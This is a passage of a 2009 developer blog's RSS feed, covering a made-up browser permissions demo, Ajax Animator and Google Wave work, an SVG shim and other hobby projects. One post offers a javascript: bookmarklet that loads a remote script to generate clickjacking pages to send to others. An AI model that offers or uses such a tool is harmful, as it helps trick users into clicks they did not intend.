&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-doctype&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;jquery.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;
            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(navigator.requestPermission){
                navigator.requestPermission(&lt;span class=&quot;hljs-string&quot;&gt;&quot;xhr&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://site.com/api.json&quot;&lt;/span&gt;)
                navigator.requestPermission(&lt;span class=&quot;hljs-string&quot;&gt;&quot;notify&quot;&lt;/span&gt;)
            }
            setInterval(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(navigator.hasPermission &amp;amp;&amp;amp; navigator.hasPermission(&lt;span class=&quot;hljs-string&quot;&gt;&quot;xhr&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://site.com/api.json&quot;&lt;/span&gt; &amp;amp;&amp;amp; navigator.hasPermission(&lt;span class=&quot;hljs-string&quot;&gt;&quot;notify&quot;&lt;/span&gt;)){
                    $(&lt;span class=&quot;hljs-string&quot;&gt;&quot;#status&quot;&lt;/span&gt;).html(&lt;span class=&quot;hljs-string&quot;&gt;&quot;YAYNESS! You granted Awesomeness!&quot;&lt;/span&gt;).css(&lt;span class=&quot;hljs-string&quot;&gt;&quot;background-color&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;green&quot;&lt;/span&gt;)
                    $.ajax(&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://site.com/api.json&quot;&lt;/span&gt;, {user: $(&lt;span class=&quot;hljs-string&quot;&gt;&quot;#userid&quot;&lt;/span&gt;).val(), pass: $(&lt;span class=&quot;hljs-string&quot;&gt;&quot;#pass&quot;&lt;/span&gt;).val()}, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(data)&lt;/span&gt;&lt;/span&gt;{
                        $.each(data,&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(message)&lt;/span&gt;&lt;/span&gt;{
                            notify(message.summary)
                        })
                    })
                }&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
                    $(&lt;span class=&quot;hljs-string&quot;&gt;&quot;#status&quot;&lt;/span&gt;).html(&lt;span class=&quot;hljs-string&quot;&gt;&quot;no permissions!&quot;&lt;/span&gt;)
                }
            },&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;);
        &lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;status&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;background-color: red&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;No Permissions, please give me some super-powers?&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;userid&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;USERNAME&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;pass&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;PASSWORD&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;

        # Super Insanely Awesome Notifier!

        This is a super awesome notifier, if this doesnt work then you are an idiot or
        the internet isnt in the future yet. Here is where the about stuff and other stuff
        and stuffs that are stuffs can be put in! And if its not in the future, we all know
        the easiest way out is to blame microsoft for all our problems and say that at
        least google tried fixing our problems but it was all microsoft's fault.

    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The great thing about the thing above is that it gracefully degrades into a functionless web page if its not running in my imaginary super browser OS of the future. It’s quite easy to make and requrires no API documentation (or at least for me since there’s only 2 API calls and I just totally made them up). It’s similar to the Jetpack and Chrome extensions idea in which the developer has little to learn for making an extension, but lowers the barrier even more: There’s &lt;em&gt;nothing&lt;/em&gt; to learn. Whats above is just a &lt;em&gt;standard html5 web page with jQuery&lt;/em&gt;. The only thing different is the hasPermission and requestPermission functions which don’t exist so I made them up. It’s not that it has anythign different, its just that the developer is thinking of the web page as a background process instead of &lt;em&gt;thinking&lt;/em&gt; of it as static content.&lt;/p&gt;
&lt;p&gt;It’s the same idea is Google Wave, it could be a Wiki, IM, or Email, all depending on how you &lt;em&gt;think&lt;/em&gt; about it.&lt;/p&gt;
&lt;p&gt;For the permissions system, it really doesn’t matter how it’s implemented but it really has to eventually be done. The web is getting new abilities, and things like Geolocation, Local Storage, Offline SQL DB, Saving to disk, Reading files, and such all require special permissions (You wouldn’t want any random site uploading your &lt;a href=&quot;http://www.hackinthebox.org/modules.php?op=modload&amp;amp;name=News&amp;amp;file=article&amp;amp;sid=5721&amp;amp;mode=thread&amp;amp;order=0&amp;amp;thold=0&quot;&gt;SAM file&lt;/a&gt; from your hard disk). Each of them have their own modal type dialog which queries the user if they want to grant the permission. Eventually, things like Audio from microphone, Video from webcam, cross-domain XHR,  and other peripherals like toasters get their own implementation, requiring special user granted permissions, an application may want 3 or more permissions simultaneously, it becomes very obvious a more consistent UI is needed for delegating these abilities.&lt;/p&gt;
&lt;p&gt;For the interface, its easier for both users and developers. Developers dont need to do something like write complex xml manifests showing which location the file which shows the about text is and which one is the help. Here, you just have a web page that you put stuff in. Since the interface is the page. The tab/web page is a &lt;em&gt;unified&lt;/em&gt; Install Page, Help Page, About Dialog, Credits, Donation Box, everything, but &lt;em&gt;unified &lt;/em&gt;(sure you could split it into multiple pages if you wanted like with any other web page)&lt;em&gt;.&lt;/em&gt; Installing is just right-clicking on the tab and selecting the menu button that says “Pin Tab”. If the application requires special privledges, the user can &lt;span style=&quot;background-color: #ffffff;&quot;&gt;click the icon which show you what the site wants, and you just check off whatever you feel the site deserves.&lt;/span&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Default Colors?</title>
      <link>http://antimatter15.com/2009/09/new-default-colors/</link>
      <pubDate>Thu, 24 Sep 2009 03:35:27 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/new-default-colors/</guid>
      <author></author>
      <description>&lt;p&gt;Since the project started  almost 3 years ago, the color scheme had been Red fill, Black stroke, and a stroke width of 1px. Is it time to change?&lt;/p&gt;
&lt;p&gt;One idea is White for the fill, Black for stroke (same), and a 5px line instead. This makes lines more easily manipulated, but it tends to make rectangles large (and the canvas is small). The normal Black/Red/1px is the same used by Flash (as far as I know), and numerous other editing tools (including svg-edit).&lt;/p&gt;
&lt;p&gt;So what do you think?&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Video Demo</title>
      <link>http://antimatter15.com/2009/09/ajax-animator-video-demo/</link>
      <pubDate>Thu, 24 Sep 2009 00:39:34 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/ajax-animator-video-demo/</guid>
      <author></author>
      <description>&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; width=&quot;640&quot; height=&quot;505&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&quot;&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowscriptaccess&quot; value=&quot;always&quot; /&gt;&lt;param name=&quot;src&quot; value=&quot;http://www.youtube.com/v/Gt6PLGk9Fqo&amp;amp;hl=en&amp;amp;fs=1&amp;amp;&quot; /&gt;&lt;param name=&quot;allowfullscreen&quot; value=&quot;true&quot; /&gt;&lt;embed type=&quot;application/x-shockwave-flash&quot; width=&quot;640&quot; height=&quot;505&quot; src=&quot;http://www.youtube.com/v/Gt6PLGk9Fqo&amp;amp;hl=en&amp;amp;fs=1&amp;amp;&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/embed&gt;&lt;/object&gt;
</description>
    </item>
    <item>
      <title>Scroll Bar Improvements</title>
      <link>http://antimatter15.com/2009/09/scroll-bar-improvements/</link>
      <pubDate>Fri, 18 Sep 2009 06:40:08 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/scroll-bar-improvements/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Scroll%20Bar%20Improvements/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Scroll%20Bar%20Improvements/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I was reading through some long-ish articles, and logically, I stare at the scrollbar to get a rough estimation of where I am in reading it.&lt;/p&gt;
&lt;p&gt;But, the horrible thing called comments and a &lt;em&gt;gasp&lt;/em&gt; theme, makes the page appear FAR longer than the article. I think that browsers, with the new &amp;lt;section&amp;gt; &amp;lt;header&amp;gt; and whatever that’s in HTML5 should interpret these markings and create a smarter scrollbar like how Chrome does the statusbar with little yellow markings where occurances are found. There should be ones which indicate the end of the article, start of comments, etc.&lt;/p&gt;
&lt;p&gt;And I’ve noticing how I’m talking about Google for just about every new post. I think that’s just abou where all the innovation is right now. Or at least all the innovation that I use and know about that gets popularized by media.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Wave Gadget</title>
      <link>http://antimatter15.com/2009/09/ajax-animator-wave-gadget/</link>
      <pubDate>Thu, 17 Sep 2009 23:18:44 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/ajax-animator-wave-gadget/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Ajax%20Animator%20Wave%20Gadget/Screenshot1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Ajax%20Animator%20Wave%20Gadget/Screenshot1-298x300.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wave.google.com/a/wavesandbox.com/#minimized:search,restored:wave:wavesandbox.com!w%252B3JUS0MHA%2525A.1&quot;&gt;https://wave.google.com/a/wavesandbox.com/#minimized:search,restored:wave:wavesandbox.com!w%252B3JUS0MHA%2525A.1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you have a Google Wave developer account, you can visit the above link to use the gadget. It supports almost all the features of the full normal Ajax Animator and many more. It includes better Text, Images, Rotation, Resizing (still needs work), Layer Visibility, Stability, Platform Support, Export options, etc. However it does notably lack the entire old right (east) panel, which also means no undo, or redo. Also since it uses a different graphics editor (VectorEditor), it does not have all the transform options which were present in OnlyPaths. It also supports the whole real time editing that Wave is so famous for. Two people can concurrently edit the same frame at the same time or one user can watch the animation while the others are editing and see the animation develop.&lt;/p&gt;
&lt;p&gt;If you aren’t fortunate enough to use wave, you can use it without the collaborative features at &lt;a href=&quot;http://antimatter15.com/ajaxanimator/wave/&quot;&gt;http://antimatter15.com/ajaxanimator/wave/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Massive file sharing networks?</title>
      <link>http://antimatter15.com/2009/09/massive-file-sharing-networks/</link>
      <pubDate>Wed, 16 Sep 2009 23:39:09 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/massive-file-sharing-networks/</guid>
      <author></author>
      <description>&lt;p&gt;With BitTorrent and everything else, logically everone just has a network around a single file everyone is interested in. It makes tit-for-tat really practical and quite easy. Almost like darwinian natural selection (well, evolution is like moore’s law, you can just about apply it to everything imaginable ignoring the massive pardigm tangents that result), the popular files are fast and the unpopular ones get slow and/or eventually die, totally lost.&lt;/p&gt;
&lt;p&gt;Certainly this almost capitalistic approach is efficient for the massively popular files where the chances are that you will encounter many fast seeds. But for those less fortunate, the downloads may slow to a crawl as peers may be geographically distant.&lt;/p&gt;
&lt;p&gt;What about something like freenet, where everyone has a cache of data that they may or may not be interested in. With such a massive netowrk, you no longer have to worry about trackers taking over as all of them are now on equal ground, finding trackers is useless as they are inhrently found. Leeching is solved by a global karma system, and all of the other problems are replaced with the single complicated problem of scalability (which totally makes the whole concept crap).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Syncing &quot;Echo&quot;</title>
      <link>http://antimatter15.com/2009/09/wave-syncing-echo/</link>
      <pubDate>Tue, 15 Sep 2009 00:39:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/wave-syncing-echo/</guid>
      <author></author>
      <description>&lt;p&gt;The problem with the implementation of lots of things like VectorEditor, SVG-edit and the Ajax Animator is that something i’m going to randomly call “echo”.&lt;/p&gt;
&lt;p&gt;Basically, you might delete something on your client, and right after that, since the result isn’t real time, the app adds the shape back, and it gets deleted again. With multiple users, it gets more confusing, and there’s a random chance that it might not even delete.&lt;/p&gt;
&lt;p&gt;In wave2 which is now a really complicated and massively slow library filled with tons of inelegant crap spanning almost 600 lines, the way it’s resolved (somewhat) is by not truly deleting things, but rather replacing it with DELETED/TIMESTAMP.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Basic Shape Resizing in VectorEditor</title>
      <link>http://antimatter15.com/2009/09/basic-shape-resizing-in-vectoreditor/</link>
      <pubDate>Fri, 11 Sep 2009 02:57:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/basic-shape-resizing-in-vectoreditor/</guid>
      <author></author>
      <description>&lt;p&gt;I made a new minor update to vectoreditor which allows things to be resized, it’s not perfect, but works mostly.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Storage</title>
      <link>http://antimatter15.com/2009/09/ajax-animator-storage/</link>
      <pubDate>Fri, 11 Sep 2009 02:54:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/ajax-animator-storage/</guid>
      <author></author>
      <description>&lt;p&gt;So I decided to mix up an old project, which I was &lt;em&gt;almost&lt;/em&gt; about to migrate to GitHub but it’s still on Google Code (&lt;a href=&quot;http://code.google.com/p/datastore-service/&quot;&gt;http://code.google.com/p/datastore-service/&lt;/a&gt;) which was basically a free service that allows easy prototyping of things by providing basic persistence (using JSONP). So I mixed it up with the Ajax Animator Standalone Player, so the Google Wave version of the ajax animator will have a Publish button which will upload things to a server and give you a shareable URL Such as &lt;a href=&quot;http://antimatter15.com/ajaxanimator/player/player.htm?1e025941543678&quot;&gt;http://antimatter15.com/ajaxanimator/player/player.htm?1e025941543678&lt;/a&gt; while it would be great if a) the URL was shorter and b) the URL was more customizable, it works basically.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator + Wave</title>
      <link>http://antimatter15.com/2009/09/ajax-animator-wave/</link>
      <pubDate>Mon, 07 Sep 2009 05:49:10 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/ajax-animator-wave/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Ajax%20Animator%20+%20Wave/SadTab.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Ajax%20Animator%20+%20Wave/SadTab-150x150.jpg&quot; &gt;&lt;/div&gt;&lt;/a&gt; sadly it led to this&lt;/p&gt;
&lt;p&gt;So I think that the Ajax Animator Wave thingy is almost done. I think it’s really awesome, there’s some new stuff in there that may help in collaboration. There is still a bit of dogfooding left (VectorEditor needs to be updated as while the new version of Raphael is being used which eliminates a lot of the hacks being used, the change in path APIs means that lines, polylines and paths all fail). So after a bit of more bug testing, I think it’s going to be pretty cool. It will definately be out by the time the 100,000 people join Google Wave (I can’t wait!). But I’m not sure if it will be today, next week, or the week after that.&lt;/p&gt;
&lt;p&gt;So to show some cool stuff I can do, I’ll publish the first time this blog has ever really seen an animation by me. But here’s the first animation I’ve made (It uses the Wave, center and flip plugins which you can access in the script executor, but someone could easily and tediously do this by hand too):&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2009/Ajax%20Animator%20+%20Wave/Wavey.gif&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Wavey&quot;  src=&quot;/articles/2009/Ajax%20Animator%20+%20Wave/Wavey.gif&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Wavey&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Try ignoring the probable trademark infringement.&lt;/p&gt;
&lt;p&gt;The cool stuff being used here are first the ability to draw a rectangle, to multi-select, multi-copy, multi-paste and manual repeatition. After that, it’s multi-dragged down, and next frame then, the &lt;code&gt;Ax.plugins\[&amp;quot;center&amp;quot;]()&lt;/code&gt; plugin is called which obviously centers all of them (by the Y axis, preserving the X one). Then it goes to the next keyframe and using &lt;code&gt;Ax.plugins[&amp;quot;Sine&amp;quot;](100,0.01)&lt;/code&gt; (first arg defines multiplier for y axis and latter defines something I forgot, i think multiplier for the current X axis).  Then the same function but with &lt;code&gt;(100,0.02)&lt;/code&gt; and then &lt;code&gt;Ax.plugins.flip()&lt;/code&gt; to make it look like the wave logo. Do some multi-select and set the color. After that cool stuff, it gets saved as text and opened in OnlyPaths Ajax Animator (which also demos a really cool feature called forwards-compatibility). It gets saved as a GIF and uploaded to my blog after that.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Gadget API issues (again)</title>
      <link>http://antimatter15.com/2009/09/wave-gadget-api-issues-again/</link>
      <pubDate>Mon, 07 Sep 2009 05:40:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/wave-gadget-api-issues-again/</guid>
      <author></author>
      <description>&lt;p&gt;So I’ve been having issues with the Wave Gadget API (again). This one is simple, Wave isn’t really real time. So right after doing a submitDelta, you can’t get() the data and expect to have the new one instantly.&lt;/p&gt;
&lt;p&gt;It’s been giving me some problems, but I’m getting around it by using my awesome wave gadget library which will now magically apply the changes immediately so you can access it even before things actually happen.&lt;/p&gt;
&lt;p&gt;Also, partially due to this, things would be far more useful if you could get the date of each insertion or deletion.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Easy Clickjacking Bookmarklet!</title>
      <link>http://antimatter15.com/2009/09/easy-clickjacking-bookmarklet/</link>
      <pubDate>Fri, 04 Sep 2009 00:07:41 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/easy-clickjacking-bookmarklet/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Easy%20Clickjacking%20Bookmarklet!/Screenshot-1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Easy%20Clickjacking%20Bookmarklet!/Screenshot-1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-1&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is actually something I did a really long time ago, but I think I should blog about my old crap. Of couse this post is very evil and will be a great aid to smart 10 year olds trying to sabotage the internet (Because having all other articles saying implying that script kiddies are 14, I’m sure this would have been useful for myself 4 years ago if i were to be so evil).&lt;/p&gt;
&lt;p&gt;Just drag this&lt;a href=&quot;javascript:%28function%28%29%7Bsc%3Ddocument.createElement%28%27script%27%29%3Bsc.src%3D%27http%3A//www.antimatter15.com/misc/clickjack.js%27%3Bdocument.body.appendChild%28sc%29%7D%29%28%29&quot;&gt; Clickjack&lt;/a&gt; link to your bookmarks bar and go to any site and click any link or button to create a page that you can send to people (or look at the source and make a more convincing page).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>RSVGShim A new SVG Shim that renders to SVG and VML using Raphael</title>
      <link>http://antimatter15.com/2009/09/rsvgshim-a-new-svg-shim-that-renders-to-svg-and-vml-using-raphael/</link>
      <pubDate>Thu, 03 Sep 2009 22:43:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/rsvgshim-a-new-svg-shim-that-renders-to-svg-and-vml-using-raphael/</guid>
      <author></author>
      <description>&lt;p&gt;For like an hour (so, not a really long time, and nothing near SVGWeb) or so, I was working on a new SVG shim similar to SVGWeb except that it renders to VML and SVG through Raphael rather than Flash (so now I can actually brag about not having &lt;em&gt;any&lt;/em&gt; plugins :P). Using it is somewhat simpler than SVGWeb, except that you need some replacing, but no need for a server, htcs, etc. Plus, the file is only 3.2 kb uncompressed, only 740 bytes gzipped and YUI’d. Also, it only works with rectangles and ellipses but could be somewhat easily modified to support anything that raphael does. While probably it does not work on IE (as I use linux and have no way to test), it’s an interesting concept.&lt;/p&gt;
&lt;p&gt;It only works with pages where a SVG element is added dynamically after the page is loaded (contrasting to SVGWeb which only allows a SVG element to be added in code).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; svgroot = rshimdoc.createElementNS(&lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;svg&quot;&lt;/span&gt;); &lt;span class=&quot;hljs-regexp&quot;&gt;//&lt;/span&gt;you coudl also just use normal createElement(&lt;span class=&quot;hljs-string&quot;&gt;&quot;svg&quot;&lt;/span&gt;), but it must be rshimdoc instead &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;

svgroot.setAttribute(&lt;span class=&quot;hljs-string&quot;&gt;'width'&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;); 
svgroot.setAttribute(&lt;span class=&quot;hljs-string&quot;&gt;'height'&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;);


(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; RHTMLElement(html element)).appendChild(svgroot)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;OR&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='objectivec'&gt;&lt;/span&gt;rshimdoc&lt;span class=&quot;hljs-variable&quot;&gt;.getElementById&lt;/span&gt;(element &lt;span class=&quot;hljs-keyword&quot;&gt;id&lt;/span&gt;)&lt;span class=&quot;hljs-variable&quot;&gt;.appendChild&lt;/span&gt;(svgroot)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So it doesn’t deviate too much from the SVG spec (just replacing document with rsvgdoc should work). And in other news, I’m moving some of my smaller works to github, so this project is also going to be hosted on GitHub.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/rsvgshim/tree/master&quot;&gt;http://github.com/antimatter15/rsvgshim/tree/master&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Migrating small stuff to GitHub</title>
      <link>http://antimatter15.com/2009/09/migrating-small-stuff-to-github/</link>
      <pubDate>Thu, 03 Sep 2009 03:46:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/09/migrating-small-stuff-to-github/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Migrating%20small%20stuff%20to%20GitHub/Screenshot2.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Migrating%20small%20stuff%20to%20GitHub/Screenshot2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;I’ll take the liberties of plagarizing this as who wouldn’t recognize its source?&lt;/p&gt;
&lt;p&gt;So I’m moving the small totally unknown and 1-2 file things that I’ve spammed Google Code with previously. Small things like js-xdb, mental-interpreter, js-tpl-engine, js-xdomain, subleq2, vxjs-ajax (a whole project for a single function? crazy stuff).&lt;/p&gt;
&lt;p&gt;So i’m shrinking my google code profile to reduce my spamminess, becasue I used to feel like it would be awesome to have a project for everything I spent more than 2 minutes on doing in hopes that someone would eventually find it interesting.&lt;/p&gt;
&lt;p&gt;Hopefully someone would find it interesting on github.&lt;/p&gt;
&lt;p&gt;I’m also adding some lost projects, like my backups of stuff that got lost when appjet shut down, a substition code cracker a few jetpacks and still adding more.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/antimatter15/tree/master&quot;&gt;http://github.com/antimatter15/antimatter15/tree/master&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Those are all the tiny projects not big enough to deserve a actual repo or google code project page.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch/JS</title>
      <link>http://antimatter15.com/2009/08/shinytouch-js/</link>
      <pubDate>Fri, 28  Aug 2009 06:17:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/shinytouch-js/</guid>
      <author></author>
      <description>&lt;p&gt;Yay for yet another demo that strives to mix an mash almost everything HTML5 related! ShinyTouch in JS dumps the stuff from a &amp;lt;video&amp;gt; tag with ogg encoded video (well, almost all video from linux is ogg encoded so it’s just whatever format i got first from cheese). It gets dumped into &amp;lt;canvas&amp;gt; and getImageData does it’s magic.&lt;/p&gt;
&lt;p&gt;Interestingly, if you don’t use the video and just do data from a raw image, you get upwards of 125fps on V8. Adding the video, it ceases to work on Chromium (maybe a linux thing? &lt;a href=&quot;http://code.google.com/p/chromium/issues/detail?id=16225&quot;&gt;this&lt;/a&gt; tells me it’s just linux, but you can never be so sure).&lt;/p&gt;
